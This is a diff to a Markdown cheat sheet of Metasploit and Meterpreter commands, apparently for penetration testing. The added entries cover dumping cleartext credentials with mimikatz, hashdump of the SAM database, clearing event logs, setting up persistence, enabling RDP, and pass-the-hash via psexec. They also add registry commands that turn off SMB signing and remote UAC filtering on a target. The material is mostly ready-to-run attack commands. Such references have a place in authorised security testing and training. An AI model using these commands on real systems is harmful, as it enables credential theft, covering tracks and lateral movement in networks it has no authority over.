@@ -113,6 +113,14 @@ use auxiliary/scanner/discovery/arp_sweep
 ```bash
 use post/windows/gather/arp_scanner
 ```
+##### Enumerate Services (Windows)
+```bash
+use post/windows/gather/enum_services
+```
+##### Enable RDP
+```bash
+meterpreter > run getgui -h
+```
 
 ### Migrate to Another Process 
 ##### Migrate to Another Process Automatically (Windows)
@@ -136,6 +144,12 @@ migrate -N <Process Name>.<Extension>
 ```
 
 ### Get Windows Credentials
+##### Dump Clear Text Credentials with mimikatz
+```bash
+sessions -i <Session #>
+load mimikatz
+wdigest
+```
 ##### Dump Clear Text Credentials and Hashes
 ```bash
 sessions -i <Session #>
@@ -145,6 +159,10 @@ creds_all
 ```
 ##### Dump the contents of the SAM database
 ```bash
+# It may be necessary to migrate to a service process, if not SYSTEM account.
+run hashdump
+# It is possible to just call "hashdump," but that may fail, even as SYSTEM, where as "run hashdump" may succeed.
+
 use post/windows/gather/hashdump
 ```
 
@@ -179,6 +197,13 @@ run
 ##### Clear System Logs
 ```bash
 meterpreter > clearev
+```
+
+### Persistence
+```bash
+run persistence -h
+
+search persistence
 ```
 
 # msfvenom
@@ -476,9 +501,21 @@ msfconsole
 use exploit/windows/smb/psexec
 set RHOSTS <Target Host>
 set SMBUser <Username>
-set SMBPass <Password>
+set SMBPass <Password> # SMBPass can be the clear text password or the password hash.  
 exploit
 ```
+Pass the hash may only work for Administrator RID 500 and not for accounts in the Administrators group.
+In which case, the remote system will need two registry entries:
+```powershell
+PS> Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWORD
+PS> Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters -Name RequireSecuritySignature -Value 0 -Type DWORD
+```
+```cmd
+C:\> reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t DWORD /d 1 /f
+C:\> reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters" /v RequireSecuritySignature /t DWORD /d 0 /f
+```
+###### [PSExec Pass the Hash](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)
+###### [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://blog.harmj0y.net/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)
 
 ##### Capture SMB Hashes
 ```bash
